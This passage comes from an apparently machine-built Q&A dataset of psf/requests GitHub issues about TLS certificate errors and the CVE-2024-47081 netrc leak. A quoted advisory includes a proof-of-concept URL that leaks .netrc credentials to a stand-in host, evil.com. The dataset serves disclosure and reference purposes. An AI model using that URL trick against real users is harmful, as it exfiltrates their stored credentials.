verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)\n\nThe above exception was the direct cause of the following exception:\n\nTraceback (most recent call last):\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/adapters.py\", line 668, in send\n    resp = conn.urlopen(\n           ^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py\", line 841, in urlopen\n    retries = retries.increment(\n              ^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/urllib3/util/retry.py\", line 519, in increment\n    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nurllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='localhost', port=5000): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, \"[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)\")))\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/api.py\", line 73, in get\n    return request(\"get\", url, params=params, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/api.py\", line 59, in request\n    return session.request(method=method, url=url, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/sessions.py\", line 589, in request\n    resp = self.send(prep, **send_kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/sessions.py\", line 703, in send\n    r = adapter.send(request, **kwargs)\n        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/my-project/.venv/lib/python3.12/site-packages/requests/adapters.py\", line 699, in send\n    raise SSLError(e, request=request)\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=5000): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, \"[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'localhost'. (_ssl.c:1000)\")))\n```\n\nReproduction:\n\n```python\n# app.py\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    return \"OK\"\n```\n\nRun it with:\n\n```\nflask run --cert ssl/cert.pem --key ssl/key.pem\n```\n\nThen:\n\n```python\nimport requests\nrequests.get(\"https://localhost:5000\", verify=\"./ssl/cert.pem\")\n```\n\nSystem info from `python -m requests.help`:\n\n```json\n{\n  \"chardet\": {\n    \"version\": null\n  },\n  \"charset_normalizer\": {\n    \"version\": \"3.4.2\"\n  },\n  \"cryptography\": {\n    \"version\": \"45.0.4\"\n  },\n  \"idna\": {\n    \"version\": \"3.10\"\n  },\n  \"implementation\": {\n    \"name\": \"CPython\",\n    \"version\": \"3.12.8\"\n  },\n  \"platform\": {\n    \"release\": \"24.5.0\",\n    \"system\": \"Darwin\"\n  },\n  \"pyOpenSSL\": {\n    \"openssl_version\": \"30500000\",\n    \"version\": \"25.1.0\"\n  },\n  \"requests\": {\n    \"version\": \"2.32.3\"\n  },\n  \"system_ssl\": {\n    \"version\": \"30400010\"\n  },\n  \"urllib3\": {\n    \"version\": \"2.4.0\"\n  },\n  \"using_charset_normalizer\": true,\n  \"using_pyopenssl\": true\n}\n```\n\nThe certificate text shows `Issuer: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd, CN=localhost`, `Subject: C=AU, ST=Some-State, O=Internet Widgits Pty Ltd, CN=localhost`, and extensions including `X509v3 Basic Constraints: critical CA:TRUE`, with no Subject Alternative Name listed. Why does Requests reject this with a hostname mismatch even though curl accepts it, and how should the certificate be generated correctly?", "answer": "The certificate has no Subject Alternative Names and that it was created as a CA certificate, not a leaf certificate. They suggested looking at Requests' tests in the repository for examples of generating certificates correctly, and guessed that curl is falling back to the Common Name even though that is no longer best practice and has not been for years.", "knowledge_type": "parametric", "grounding_sources": [], "answer_grounded_in": "c2", "leak_flags": []}], "answer_in_thread_refs": [], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-11T22:57:45.915368Z", "review_note": ""}
{"id": "psf/requests/issue/6964", "repo": "psf/requests", "number": 6964, "title": "CVE-2024-47081: Netrc credential leak in PSF requests library", "url": "https://github.com/psf/requests/issues/6964", "state": "closed", "created_at": "2025-06-04T12:06:09Z", "closed_at": "2025-06-09T16:59:29Z", "labels": [], "reporter": "corneliusroemer", "security_topic": "availability of fix for netrc credential leak CVE", "qa_summary": "The developer needed to know if CVE-2024-47081 (netrc credential leak) is fixed, and the answer confirms it is addressed in requests 2.32.4 with advisory GHSA-9hjg-9r4m-mvj7.", "question_comment_id": "c0", "answer_comment_id": "c1", "question_author": "corneliusroemer", "answer_author": "nateprewitt", "answerer_role": "maintainer", "artifacts_needed": ["advisory", "code"], "hard_facts": {"cve_ids": ["CVE-2024-47081"], "ghsa_ids": ["GHSA-9hjg-9r4m-mvj7"], "cwe_ids": [], "osv_ids": [], "fixed_versions": ["2.32.4"], "fix_prs": [], "fix_commits": [], "advisory_urls": ["https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7"]}, "human_note": "", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "corneliusroemer", "timestamp": "2025-06-04T12:06:09Z", "body": "There does not yet seem to be an issue nor an advisory about CVE-2024-47081 which was recently disclosed on seclists.org - I'm thus copying the advisory here:\n\n```\nFrom: Juho Fors\u00e9n via Fulldisclosure <fulldisclosure () seclists org>\nDate: Sat, 31 May 2025 06:30:50 +0000\nThe PSF requests library (https://github.com/psf/requests & https://pypi.org/project/requests/) leaks .netrc \ncredentials to third parties due to incorrect URL processing under specific conditions.\n\nIssuing the following API call triggers the vulnerability:\n\n  requests.get('[http://example.com:@evil.com/&apos](http://example.com@evil.com/&apos);)\n\nAssuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.\n\nThe root cause is \nhttps://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245\n\nThe vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available. \nCVE-2024-47081 has been reserved by GitHub for this issue.\n\nAs a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.\n```\nLink: https://seclists.org/fulldisclosure/2025/Jun/2", "role": "body"}, {"id": "c1", "author": "nateprewitt", "timestamp": "2025-06-09T16:59:29Z", "body": "2.32.4 has been release which should address this CVE. Resolving now that the patch is available, you can read the public advisory [here](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7).", "role": "comment"}], "qa_pairs": [{"qid": "psf/requests/issue/6964#1", "question": "There does not yet seem to be an issue nor an advisory about CVE-2024-47081, which was recently disclosed on seclists.org, so I\u2019m copying the advisory here:\n\n```\nFrom: Juho Fors\u00e9n via Fulldisclosure <fulldisclosure () seclists org>\nDate: Sat, 31 May 2025 06:30:50 +0000\nThe PSF requests library (https://github.com/psf/requests & https://pypi.org/project/requests/) leaks .netrc \ncredentials to third parties due to incorrect URL processing under specific conditions.\n\nIssuing the following API call triggers the vulnerability:\n\n  requests.get('[http://example.com:@evil.com/&apos](http://example.com@evil.com/&apos);)\n\nAssuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.\n\nThe root cause is \nhttps://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245\n\nThe vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available. \nCVE-2024-47081 has been reserved by GitHub for this issue.\n\nAs a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.\n```\n\nLink: https://seclists.org/fulldisclosure/2025/Jun/2\n\nIs there now a requests issue/advisory or fix available for CVE-2024-47081, the reported .netrc credential leak to third parties caused by incorrect URL processing?", "answer": "2.32.4 has been release which should address this CVE. Resolving now that the patch is available, you can read the public advisory [here](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7).", "knowledge_type": "grounded", "grounding_sources": ["requests 2.32.4", "https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7"], "answer_grounded_in": "c1", "leak_flags": []}], "answer_in_thread_refs": ["GHSA-9HJG-9R4M-MVJ7", "https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7"], "leak_flags": [], "normalizer_model": "openai/gpt-5.5", "reviewed_at": "2026-06-15T20:19:55.980372Z", "review_note": ""}
{"id": "psf/requests/issue/6945", "repo": "psf/requests", "number": 6945, "title": "`SSLCertVerificationError` when fetching `https://od.moi.gov.tw/api/v1/`", "url": "https://github.com/psf/requests/issues/6945", "state": "closed", "created_at": "2025-05-06T17:03:58Z", "closed_at": "2025-05-19T02:03:23Z", "labels": [], "reporter": "danny0838", "security_topic": "SSL verification failure due to missing Subject Key Identifier in root certificate", "qa_summary": "The developer needed to know why requests raises SSLCertVerificationError for the TW domain, and the answer explains it\u2019s due to strict X509 verification requiring a Subject Key Identifier, citing the CPython issue comment (https://github.com/python/cpython/issues/107361#issuecomment-2917808686).", "question_comment_id": "c0", "answer_comment_id": "c6", "question_author": "danny0838", "answer_author": "klausenbusk", "answerer_role": "commenter", "artifacts_needed": ["documentation", "external_reference"], "hard_facts": {"cve_ids": [], "ghsa_ids": [], "cwe_ids": [], "osv_ids": [], "fixed_versions": [], "fix_prs": [], "fix_commits": [], "advisory_urls": ["https://github.com/python/cpython/issues/107361#issuecomment-2917808686", "https://github.com/urllib3/urllib3/issues/3571"]}, "human_note": "Accepted because the question concerns TLS verification inconsistency and the answer correctly identifies strict certificate validation rules with authoritative upstream references.", "llm_confidence": 0.9025, "comments": [{"id": "c0", "author": "danny0838", "timestamp": "2025-05-06T17:03:58Z", "body": "Fetching API under `https://od.moi.gov.tw/api/v1/` raises an `SSLCertVerificationError`, while no certificate issue is reported when opening the same URL in the browser (latest Chrome or Firefox).\n\n## Expected Result\n\nNo error should be raised.\n\n## Actual Result\n\nAn error is raised: `requests.exceptions.SSLError: HTTPSConnectionPool(host='od.moi.gov.tw', port=443): Max retries exceeded with url: /api/v1/rest/datastore/A01010000C-002150-013?limit=1 (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Missing Subject Key Identifier (_ssl.c:1028)')))`\n\n## Reproduction Steps\n\n```python\nimport requests\nimport certifi\nurl = 'https://od.moi.gov.tw/api/v1/rest/datastore/A01010000C-002150-013?limit=1'\nrequests.get(url, verify=certifi.where())\n```\n\n## System Information\n\n    $ python -m requests.help\n\n```json\n{\n  \"chardet\": {\n    \"version\": \"5.2.0\"\n  },\n  \"charset_normalizer\": {\n    \"version\": \"3.4.2\"\n  },\n  \"cryptography\": {\n    \"version\": \"\"\n  },\n  \"idna\": {\n    \"version\": \"3.10\"\n  },\n  \"implementation\": {\n    \"name\": \"CPython\",\n    \"version\": \"3.13.3\"\n  },\n  \"platform\": {\n    \"release\": \"10\",\n    \"system\": \"Windows\"\n  },\n  \"pyOpenSSL\": {\n    \"openssl_version\": \"\",\n    \"version\": null\n  },\n  \"requests\": {\n    \"version\": \"2.32.3\"\n  },\n  \"system_ssl\": {\n    \"version\": \"30000100\"\n  },\n  \"urllib3\": {\n    \"version\": \"2.4.0\"\n  },\n  \"using_charset_normalizer\": false,\n  \"using_pyopenssl\": false\n}\n```\n", "role": "body"}, {"id": "c1", "author": "sigmavirus24", "timestamp": "2025-05-06T19:26:01Z", "body": "Please use either your browser, or OpenSSL, or curl to retrieve the certificate chain being sent by the server. This error isn't specific to requests but is happening at the OpenSSL layer in the standard library. Regardless, I may be able to help you find workarounds ", "role": "comment"}, {"id": "c2", "author": "danny0838", "timestamp": "2025-05-07T08:23:40Z", "body": "This is the certificate chain download from latest Firefox:\n\n```\n-----BEGIN CERTIFICATE-----\nMIIIDjCCBvagAwIBAgIQR+kAAAAH4m1bcnsGEqKryDANBgkqhkiG9w0BAQsFADBT\nMQswCQYDVQQGEwJUVzESMBAGA1UEChMJVEFJV0FOLUNBMTAwLgYDVQQDEydUV0NB\nIFNlY3VyZSBTU0wgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkwHhcNMjUwNDAxMTAy\nMDM3WhcNMjYwNDAxMTU1OTU5WjBxMQswCQYDVQQGEwJUVzEPMA0GA1UEBwwG6Ie6\n54GjMTkwNwYDVQQKDDDmlL/lupzmqZ/pl5wt6KGM5pS/6ZmiLeWFp+aUv+mDqC3o\ns4foqIrmnI3li5nlj7gxFjAUBgNVBAMTDW9kLm1vaS5nb3YudHcwggEiMA0GCSqG\nSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCpuzCMiEKGVfAQG8hJr0h2oYPIidShtrWZ\ngwg7cPKI67yIaTaWjevH7Q9gsued5rIk5oY66nKOxNmJT9CiU9FxdV/KPhTyVAft\npZsgW0V9UNXKKtkgbEWTauHvhsUu9y6zdr8Ye6aK2eHkhI9NgQgEDQgvLN7F9Rad\nN0jYvvn6PKVSin6CcdX32f6syuG0bjhV3E/4Y1go8mwsiPB4+Dja2uA2aCpLhz77\nWy1mcm6qvb1HNRUvvUbIeYICk4TsKWO/dekej/dMHB8gjKkdfSts7qLUQo9ER5hG\nkX0WOLLHsw1IFLWfXoE8u5BIUp44YU96W5lYei1q63Com6d0nFclAgMBAAGjggS+\nMIIEujAfBgNVHSMEGDAWgBSS5/piFnGM85dxQsYGp+BGYUtctjApBgNVHQ4EIgQg\nxmfXUSazOCN2BSpiOLoqrMwxn4qAr22JvbZgIyKKAVkwWAYDVR0fBFEwTzBNoEug\nSYZHaHR0cDovL3NzbHNlcnZlci50d2NhLmNvbS50dy9zc2xzZXJ2ZXIvU2VjdXJl\nc3NsX3Jldm9rZV9zaGEyXzIwMjNHMy5jcmwwGAYDVR0RBBEwD4INb2QubW9pLmdv\ndi50dzCBgwYIKwYBBQUHAQEEdzB1MEYGCCsGAQUFBzAChjpodHRwOi8vc3Nsc2Vy\ndmVyLnR3Y2EuY29tLnR3L2NhY2VydC9zZWN1cmVfc2hhMl8yMDIzRzMuY3J0MCsG\nCCsGAQUFBzABhh9odHRwOi8vdHdjYXNzbG9jc3AudHdjYS5jb20udHcvMEoGA1Ud\nIARDMEEwNQYLKwYBBAGCvyUBARUwJjAkBggrBgEFBQcCARYYaHR0cHM6Ly93d3cu\ndHdjYS5jb20udHcvMAgGBmeBDAECAjAMBgNVHRMBAf8EAjAAMA4GA1UdDwEB/wQE\nAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwggLnBgorBgEEAdZ5\nAgQCBIIC1wSCAtMC0QB1AGQRxGykEuyniRyiAi4AvKtPKAfUHjUnq+r+1QPJfc3w\nAAABlfDeCegAAAQDAEYwRAIgLLs2pjH/eu4xm+KnHYqizOazdCN+wjpE8GCR3I9W\ney8CIFqWZVpK5onvncYfJZda9OUCAlmGC74rD09blDuSyXmMAHUADleUvPOuqT4z\nGyyZB7P3kN+bwj1xMiXdIaklrGHFTiEAAAGV8N4J6QAABAMARjBEAiBUOEJh3G4c\nW0AKTOPQklp4yEXjl7V/Wmw4Y4JhwRdCUQIgAWka3fKtPddMDLx0GOPgFJ7wMJir\nTykZLT9KZGY3Jo8AdwBJnJtp3h187Pw23s2HZKa4W68Kh4AZ0VVS++nrKd34wwAA\nAZXw3gn1AAAEAwBIMEYCIQDr7Y/x6LDGrHXcAz3tdOgyQAfVukVR2ZEK5l5ZiEf4\nwAIhAIEoHulVN9kM86J5O/1fza1rZRjT+InlJ5ipW0GGUEn7AHcAyzj3FYl8hKFE\nX1vB3fvJbvKaWc1HCmkFhbDLFMMUWOcAAAGV8N4J9gAABAMASDBGAiEAlC90P13E\nn9Nq0j2oLzVqvlWzaD+GR/B5E2Hb191UgH8CIQCRSV4DS9lgMu31zjYCR3Zv5lUk\nI3otOvU4IVpBmKhCcAB3AHTbnVj31H6d/Xh6FiqZHBjPaY2nxymRjJoYsEUNukS8\nAAABlfDeCdwAAAQDAEgwRgIhALYnzL7ctkrRf5CuMsrkS9bpapueWU0pHD94a5Jz\n7/DoAiEA9P650qU2EGXhOYtfzN1Woav3/GriBLDJZpuoersdkF4AdgAlL5TCKynp\nbp9BGnIHK2lcW1L/l6kNJUC7/NxR7E3uCwAAAZXw3goZAAAEAwBHMEUCIGq7bKbk\nbckVwgC6jASnIiLJjivsmdyiaxIKTaJMvaStAiEA5MeN0kwSZkumQ3g5NYUqOh5F\nQSQhbMrtJ7+0Aax57YowDQYJKoZIhvcNAQELBQADggEBAL8DX3C4k3W/+TU8nfgW\n/dmuT0t8sDFT7KNuo1EsDCUqxXHl59R1jo8dls70Pgob570P2ZoSOmFxXRm0BBuV\nN9Y34YvyzsKizT2+xFPq97V2wf3jMma4cL81CIYhnhSlOz6cMmsyEVd/yuqeKAXm\n7VhezKafwgJvZJvzjeng8jKNWOvwckdtMLTGeBC6cVQmA+/BAhgLNrwe2VZ6bK8R\nlsshzbvpe0Ax+WUcP6tITCQP1Z3VnwqpcIU/ZLuNrYpewhNO22T3kdE/wOhZAbml\n8Z9WogfkNttdXboSpJRz2IzedCcCgj/j8ngaRymlu7FN/xfdjYRD1zfuyXmEBtiQ\n8Ko=\n-----END CERTIFICATE-----\n-----BEGIN CERTIFICATE-----\nMIIFxjCCA66gAwIBAgIQQAE0s2gAAAAAAAAM0KoI7DANBgkqhkiG9w0BAQsFADBR\nMQswCQYDVQQGEwJUVzESMBAGA1UEChMJVEFJV0FOLUNBMRAwDgYDVQQLEwdSb290\nIENBMRwwGgYDVQQDExNUV0NBIEdsb2JhbCBSb290IENBMB4XDTIzMTAxNjA5MDEw\nNFoXDTMwMTAxNjE1NTk1OVowUzELMAkGA1UEBhMCVFcxEjAQBgNVBAoTCVRBSVdB\nTi1DQTEwMC4GA1UEAxMnVFdDQSBTZWN1cmUgU1NMIENlcnRpZmljYXRpb24gQXV0\naG9yaXR5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyS5amjYQhd10\nhZs00r7RXdI3ASka2AQmJnOyA6bqvAYOMlMECUdlsjDccdmMdHx8YTYYMtmCy+UB\nRJZ/ytVANVQlfcUvXzWfauFs8XpCC/Th+Ed2tIEEGK218QsBebImAHPGDvp2Yglj\nXVaQR/0FeN1lIzQ3iUkad0dCsC/bxFiWsmsjeSscTaxrYzHFADUhK0qj4W5PmOuw\nlAR3C4XXgzPAI3V0qBpQ7sqgNLaNBFTZkP6AVryZC+DapfWBIMmIxIOg8g25MKb4\nXvXkCLYKIxi8Djhv1zSmLLrKbQFZrjWlD/OWqInPPmSwBrKZ13EMQhoRRi1pXfN+\nJ2ugR/PUQQIDAQABo4IBljCCAZIwHwYDVR0jBBgwFoAUSNvN3o7pSXJaiOix2D0H\ns7lrZlAwHQYDVR0OBBYEFJLn+mIWcYzzl3FCxgan4EZhS1y2MA4GA1UdDwEB/wQE\nAwIBhjAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwSgYDVR0gBEMwQTA1\nBgsrBgEEAYK/JQEBFTAmMCQGCCsGAQUFBwIBFhhodHRwczovL3d3dy50d2NhLmNv\nbS50dy8wCAYGZ4EMAQICMEkGA1UdHwRCMEAwPqA8oDqGOGh0dHA6Ly9yb290Y2Eu\ndHdjYS5jb20udHcvVFdDQVJDQS9nbG9iYWxfcmV2b2tlXzQwOTYuY3JsMBIGA1Ud\nEwEB/wQIMAYBAf8CAQAwdgYIKwYBBQUHAQEEajBoMDwGCCsGAQUFBzAChjBodHRw\nOi8vc3Nsc2VydmVyLnR3Y2EuY29tLnR3L2NhY2VydC9yb290NDA5Ni5jcnQwKAYI\nKwYBBQUHMAGGHGh0dHA6Ly9yb290b2NzcC50d2NhLmNvbS50dy8wDQYJKoZIhvcN\nAQELBQADggIBADVzQW2rRsMiWoV